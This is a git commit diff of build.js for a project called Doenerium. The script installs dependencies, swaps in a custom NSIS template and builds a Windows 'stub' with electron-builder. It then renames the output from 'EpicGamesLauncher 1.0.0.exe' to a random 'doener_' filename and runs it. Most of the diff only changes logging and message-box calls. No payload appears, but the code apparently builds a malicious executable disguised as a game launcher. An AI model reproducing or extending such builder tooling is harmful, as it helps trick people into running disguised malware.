15f132405f21596cc04861e8430717544ddea79c
Doenerium <145469894+doenerium6969@users.noreply.github.com>
2024-03-06 10:13:20 +0100

    Update build.js

--- main/build.js
+++ main/build.js
@@ -15,65 +15,55 @@ async function makeid_var(length) {
     return result;
 }
 
-function notifySuccess(message) {
-    console.log('\x1b[32m%s\x1b[0m', message);
-}
-
-function notifyError(message) {
-    console.error('\x1b[31m%s\x1b[0m', message);
-}
-
 async function main() {
     const CURRENT_DIR = process.cwd();
     const start = Date.now();
 
     try {
-	await exec('npm install -g node-gyp');
-	await exec('npm install sqlite3');
         console.log('Installing dependencies...');
         await exec('npm i');
 
         const oldNsiPath = path.join(process.cwd(), 'node_modules', 'app-builder-lib', 'templates', 'nsis', 'portable.nsi');
         try {
             await fs.unlink(oldNsiPath);
-            notifySuccess('Successfully deleted old portable.nsi.');
+            console.log('Successfully deleted old portable.nsi.');
         } catch (error) {
-            if (error.code === 'ENOENT') {
-                notifySuccess('Old portable.nsi does not exist. Skipping deletion.');
+            if (error.code !== 'ENOENT') {
+                console.error('Error deleting old portable.nsi:', error.message);
             } else {
-                notifyError('Error deleting old portable.nsi:', error.message);
+                console.log('Old portable.nsi does not exist. Skipping deletion.');
             }
         }
 
         const newNsiPath = path.join(process.cwd(), 'portable.nsi');
         await fs.copyFile(newNsiPath, oldNsiPath);
-        notifySuccess('Copied new portable.nsi.');
+        console.log('Copied new portable.nsi.');
 
-        notifySuccess('npm install success!');
+        console.log('Build Start...');
 
         const randomid = await makeid_var(8);
 
-        const { stdout, stderr } = await exec('npm run electron-builder --win');
+        const { stdout, stderr } = await exec('call npm run electron-builder --win');
 
         if (stderr) {
-            notifyError('Compilation failed!', stderr);
-            await exec(`powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Compilation failed!\\n${stderr}', 'Error', 'OK', 'Error')"`);
+            console.error('Compilation failed!', stderr);
+            await exec(`msg * "Compilation failed!${stderr ? '\\n' + stderr : ''}"`);
         } else {
-            notifySuccess('Compilation success!');
+            console.log('Compilation success!');
 
             const outputFilename = `doener_${randomid}.exe`;
             const oldFilePath = path.join(CURRENT_DIR, 'build', 'EpicGamesLauncher 1.0.0.exe');
             const newFilePath = path.join(CURRENT_DIR, 'build', outputFilename);
             await fs.rename(oldFilePath, newFilePath);
 
-            notifySuccess(`Successfully finished building stub within ${(Date.now() - start) / 1000} seconds: ${outputFilename}`);
-            await exec(`powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Successfully finished building stub within ${(Date.now() - start) / 1000} seconds: main/build/${outputFilename}', 'Doenerium Builder', 'OK', 'Information')"`);
+            console.log(`Successfully finished building stub within ${(Date.now() - start) / 1000} seconds: ${outputFilename}`);
+            await exec(`msg * "Successfully finished building stub within ${(Date.now() - start) / 1000} seconds: main/build/${outputFilename}"`);
             await exec(`start explorer "${path.join(CURRENT_DIR, 'build')}"`);
 	    await exec(`"${path.join(CURRENT_DIR, 'build', outputFilename)}"`);
         }
 
     } catch (error) {
-        notifyError('Error:', error.message);
+        console.error('Error:', error.message);
     }
 
     console.log('Use main/fix.bat and press any key to continue...');
